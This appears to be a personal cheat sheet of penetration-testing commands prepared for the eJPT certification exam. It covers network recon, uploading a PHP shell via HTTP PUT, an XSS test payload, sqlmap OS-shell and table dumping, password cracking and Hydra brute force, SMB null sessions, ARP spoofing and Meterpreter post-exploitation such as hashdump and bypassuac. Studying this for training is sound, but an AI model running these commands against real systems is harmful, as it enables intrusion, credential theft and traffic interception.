These notes will come handy in eJPT exam. Make sure to replace IP and PORT.

## Routing
To check routing,
`ip route`

To add routing,
`ip route add network/CIDR via gatewayIP [dev ifname]` 

---

## IP and MAC Address

To check ip and mac addr,
`ifconfig`
`ip addr show [interface]`

---

## Checking ARP Cache

To check the arp cache table,
`arp -a`
`arp`
`ip neighbour`

---

## Listening Ports

To check listening ports and current TCP connections on host,

On linux,
`netstat -tunp`

On windows,
`netstat -ano`

---

## WHOIS

To perform whois lookup on a target,
`whois <target IP>/ site.com`

---

## Ping Sweep

To perform a ping sweep or find alive hosts on a network,
`fping -a -g network/CIDR 2>/dev/null
nmap -sn network/CIDR`

---

## Nmap Scan

OS detection,
`nmap -O -Pn network/CIDR`

Quick Scanning,
`nmap -sC -sV -T4 network/CIDR`

Full Scanning,
`nmap -sC -sV -T4 -p- network/CIDR`

UDP Scanning,
`nmap -sU -sV -T4 network/CIDR`

---

## Banner grabbing for HTTP services

To grab the banner of a host,
`nc -v <machine IP> PORT`
`HEAD / HTTP/1.0`

## Banner grabbing for HTTPS services

To grab the banner of the host,
`openssl s_client -connect <machine IP>:PORT`
`HEAD / HTTP/1.0`

To debug the host,
`openssl s_client -connect hack.me:443 -debug`

To know the state of the connection,
`openssl s_client -connect hack.me:443 -state`

Want nothing related to certificate, state or other information but communication with server,
`openssl s_client -connect hack.me:443 -quiet`

## Httprint

To fingerprint webservers,
`httprint -P0 -h network/CIDR -s /path/to/signaturefile.txt`

## HTTP Verbs (GET, POST, HEAD, DELETE, PUT, OPTIONS)

To view what other http verbs are available, use OPTIONS verb,
`nc <machine IP> 80`
`OPTIONS / HTPP/1.0`

Using http verbs to upload a shell. Find the content-length then use PUT to upload the shell. Make sure you include the size of the payload when using the PUT command,
`wc -m shell.php`
`x shell.php`

`PUT /shell.php`
`Content-type: text/html`
`Content-length: x`

---
## Directory and File Scanning

Using dirsearch.py,
`dirsearch.py -u http://<machine IP>:PORT -e * 2>/dev/null`

Using gobuster,
`gobuster dir -u http://<machine IP>:PORT/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -q 2>/dev/null`

Using dirb,
`dirb http://<machine IP>:PORT/ -u username:pass`

---
## Advance Google Search

To use google dorks,
`site:`
`intitle:`
`inurl:`
`filetype:`
`AND, OR, &, |, -`

---
## Cross Site Scripting (XSS) Steps:

To test if there's an XSS present on a website,
 - Find a reflection point
 - Test with `<i>` tag
 - Test with HTML/JavaScript code

`<script>alert(1)</script>`

**Reflected XSS:** Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload.

**Persistent XSS:** Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post.

---
## SQLMAP

To check if website is vulnerable to SQLi,
`sqlmap -u http://<machine IP>:PORT -p parameter`

Check if POST parameter is vulnerable to SQLi,
`sqlmap -u http://<machine IP>:PORT  --data POSTstring -p parameter`

To check if we can get os-shell using SQLmap,
`sqlmap -u http://<machine IP>:PORT --os-shell`

To dump the tables,
`sqlmap -u http://<machine IP>:PORT --dump`

---
## Password Attacks

Unshadow tool prepares file ready to use with JTR for cracking password,
`unshadow passwd shadow > hashpass`

## Hash Cracking

To crack the hashed passwords,
`john --wordlist=/path/to/wordlist.txt -users=user.txt hashpass`

---
## Network Attacks using HYDRA

To brute force the passwords of network service SSH,
`hydra -L users.txt -P passwd.txt <machine IP> -f -t 4 ssh`

To brute force the passwords of network service TELNET,
`hydra -L users.txt -P passwd.txt telnet://<machine IP>`

---
## Passwords, Users List, Scripts

user list,
**/usr/share/ncrack/minimal.usr**

passwords list(s),
**/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt**
**/usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt**
**/usr/share/wordlists/rockyou.txt**

nmap scripts,
**/usr/share/nmap/scripts**

---

## Bash Shell

To get all env var,
`env`

To get path,
`echo $PATH`

PATH location,
`/bin` or `/usr/bin`

to find command real location,
`which command`

To open manual pages,
`man command`

Output redirectors,
Overwrite something, 
`>`
Appending something,
`>>`
Redirection to another command,
`|`

---
## Subdomain Enum

To enumerate subdomains,
`sublist3r -d site.com`

---
## Windows Shares using Null Sessions

via nmblookup,
`nmblookup -A <machine IP>`

List shares using smbclient,
`smbclient -L //<machine IP> -N`

Mount Shares using smbclient,
`smbclient //<machine IP>/share -N`

Exploiting Null Sessions using Enum4linux:

To check if the remote host is vulnerable to null session
`enum4linux -n 192.168.99.162`
To gather info,
`enum4linux -a <machine IP>`

---
## ARP Spoofing

To enable Port Forwarding,
`echo 1> /proc/sys/net/ipv4/ip_forward`

Run arpspoof,
`arpspoof -i [interface] -t <target machine IP> -r <host machine IP>`

---
## Metasploit

Basic commands of metasploit-framework:

To start metasploit-framework using CLI,
`msfconsole`

Without banner,
`msfconsole -q`

after starting of MSF, these are the basic commands,
`search x`
`use x`
`info`
`options, show advanced options`
`SET X (e.g. set RHOST 10.10.10.10, set payload x)`

## Meterpreter Commands

After getting meterpreter shell, we'll can issue some commands which will help us in exploiting the machine,
`background`
`sessions -l`
`sessions -i N (N is number)`
`sysinfo, ifconfig, route, getuid`
`getsystem (privesc)`
`bypassuac`
`download x /root/`
`upload x C:\\Windows`
`shell`
`hashdump`

For auto routing,
`use post/multi/manage/autoroute`
then set the options {SESSIONS, SUBNET} (will work if meterpreter shell shows that user is root)

Check active route table,
`route`

port forwarding,
`portfwd add -L <attacker machine IP> -l listening_port -p 80 -r <host machine IP>`

Meterpreter Proxy and Autoroute Blog,
http://blog.safebuff.com/2017/01/02/Meterpreter-Proxy-and-Route/